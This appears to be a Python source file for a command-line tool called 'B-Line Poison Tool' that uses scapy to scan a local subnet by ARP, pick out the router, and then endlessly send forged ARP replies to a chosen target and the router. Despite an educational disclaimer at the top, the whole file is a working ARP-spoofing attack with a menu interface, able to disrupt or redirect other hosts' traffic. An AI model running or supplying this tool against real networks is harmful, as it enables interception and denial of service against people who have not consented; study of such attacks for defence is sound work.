""" Created by Samuel Quarm. Use ethically 
DISCLAIMER:
This tool is provided for educational and research purposes only.
Unauthorized use on networks you do not own or have explicit permission to test
may violate the law. The author is not responsible for misuse.
"""
#----------------------------------------------------------------------------------------------------------------------------------------------------------
#ARP Poison function
#Imports
from scapy.all import IP, ARP, Ether, srp, sendp, conf, get_if_list, TCP, RandShort, RandIP, UDP, RandMAC
import ipaddress, socket, time
from rich.console import Console
from rich.table import Table
from rich.live import Live
import time
import pyfiglet
from termcolor import colored
import netifaces
import ipaddress

#variables in the rich library
console = Console()
#----------------------------------------------------------------------------------------------------------------------------------------------------------



#find network's subnet
def get_lan_subnet():
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            ipv4_info = addrs[netifaces.AF_INET][0]
            ip = ipv4_info['addr']
            netmask = ipv4_info['netmask']

            # Skip loopback and /32 addresses
            if ip.startswith("127.") or netmask == "255.255.255.255":
                continue

            network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
            return str(network)
    return None

#Automated MAC Address
def get_mac(ip):
    arp_req = ARP(pdst = ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast / arp_req
    answered, _ = srp(arp_packet, timeout = 2, verbose = 0)
    for sent, recieved in answered:
        return recieved.hwsrc
    return None



#----------------------------------------------------------------------------------------------------------------------------------------------------------



#ARP Request Scan
def arp_scan():
    ROUTER_INFO = None

    subnet = get_lan_subnet()
    if not subnet:
        subnet = console.input("[yellow]Could not detect subnet automatically. Enter your subnet: ")

    console.print(f"[green]Scanning subnet: {subnet}\n")

    # Create table
    table = Table(title="\n[!] ARP Scan Results [!]", title_style="blue", style = "blue",show_lines=True)
    table.add_column("Hostname", style="green")
    table.add_column("IP Address", style="green")
    table.add_column("MAC Address", style="green")

    arp = ARP(pdst=subnet)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    # Send packets
    answered, _ = srp(packet, timeout=0.5, verbose=2)

    with Live(table, refresh_per_second=2) as live:  # live updates
        for sent, received in answered:
            ip = received.psrc
            mac = received.hwsrc
            try:
                host = socket.gethostbyaddr(ip)[0]
            except socket.herror:
                host = "unknown"

            if ip.endswith(".1"):
                ROUTER_INFO = (ip, mac)
                table.add_row("[bold red]Router[/bold red]", ip, mac)
            else:
                table.add_row(host, ip, mac)

            live.update(table)

    if not ROUTER_INFO:
        console.print("[red]Router not found in the scanned subnet.")

    return ROUTER_INFO



#----------------------------------------------------------------------------------------------------------------------------------------------------------



#ARP Poisoning Function for Target Only
def arp_poison(target_ip, router_ip, router_mac):

      #automatically inserted target mac variabke
    
    target_mac = get_mac(target_ip)
    if not target_mac:
        console.print(f"[red] Could not resolve MAC for {target_ip}")
        return 
    fake_mac = "00:11:22:33:44:55"  
    packet_for_target = Ether(dst=router_mac, src=fake_mac) / ARP(op=2, psrc=target_ip, hwsrc=fake_mac, hwdst=router_mac, pdst=router_ip)
    packet_for_router = Ether(dst=target_mac,src=fake_mac) / ARP(op=2, psrc=router_ip, hwsrc=fake_mac, hwdst=target_mac, pdst=target_ip)
    iface = conf.iface

    console.print(f"[yellow]Poisoning {target_ip} and {router_ip}...")
    try:
        while True:
            sendp(packet_for_target, iface=iface, verbose=0, count=50)  
            sendp(packet_for_router, iface=iface, verbose=0, count=50)
            time.sleep(2)


            console.print("[green]ARP Poisoning packets sent successfully.\n")
            console.print("[blue]ARP Poisoning completed. Press Ctrl+C to stop.")
    except Exception as e:
        console.print("[Red] Failed to Send Poisoning Packets. Please Try Again. \n")


    
#----------------------------------------------------------------------------------------------------------------------------------------------------------

#MAIN Execution

if __name__ == "__main__":
    title_text = pyfiglet.figlet_format("-----------\n      B-Line \n----------", font= "slant", width=200)
    arp_scan_text = pyfiglet.figlet_format("-----------\n ARP Scan \n----------", font= "slant", width=200)
    arp_poison_emoji = r"""
                          ++++++++++++                
                      ++++++++++++++++++++            
                    ++++++++++++++++++++++++          
                   ++++++++++++++++++++++++++         
                   ++++++++++++++++++++++++++++        
                   ++++++++++++++++++++++++++++         
                   ++++++++++++++++++++++++++++         
                    ++++++++++++++++++++++++++         
                    ++++++++++++++++++++++++++         
            +++++   ++++     ++++++++     ++++    +++++
            +++++   ++++       ++++       ++++    +++++
            ++++++ +++++      ++++++      +++++ ++++++ 
            +++++++++ ++++++++++++++++++++++++ +++++++++
            ++++++++++ +++++++++   +++++++++ ++++++++++
                    +  ++++++++++++++++++  +          
                        ++++++++++++++++               
                      ++ ++++++++++++++ ++             
             ++++++++++   ++++++++++++ +++++++++++     
                ++++++++               +++++++++    
                ++++++                  ++++++       
                  ++++                    ++++       
"""
    arp_poison_text = pyfiglet.figlet_format("-----------\n ARP POISON\n----------", font= "slant", width=200)


    while True:
        console.print(f"[red]{title_text}")
        console.print("[bold green]Welcome to the B-Line Poison Tool! \n")
        console.print("[yellow]This tool allows you to perform network scans through ARP Requests and ARP Poison Attacks.\n")
        console.print("[red]Please ensure you have the necessary permissions/dependencies to use this tool.\n")
        choice = console.input("\n[yellow]Please Select: \n"
        "ARP Poison:   [1] \n"
        "Exit: [2] \n"
        "Attack: ").strip().lower() 

        if choice == "1":
            console.print(f"[red]{arp_poison_emoji}")
            console.print(f"[red]\n{arp_poison_text}\n")
            console.print("[yellow]------------------------------------------------------------ \n")
            target_ip = console.input("[yellow]| Enter Target IP:")
            ROUTER_INFO = arp_scan()
            if ROUTER_INFO:
                router_ip, router_mac = ROUTER_INFO
                arp_poison(target_ip=target_ip, router_ip=ROUTER_INFO[0],router_mac=ROUTER_INFO[1])
            else:
                console.print("[red]Router information is not available. Cannot proceed with ARP Poisoning.")

        elif choice == "2":
            console.print("[red]Exiting the tool. Goodbye!")
            break
        
        else:
            console.print("[red]Invalid choice. Please select a valid option.")

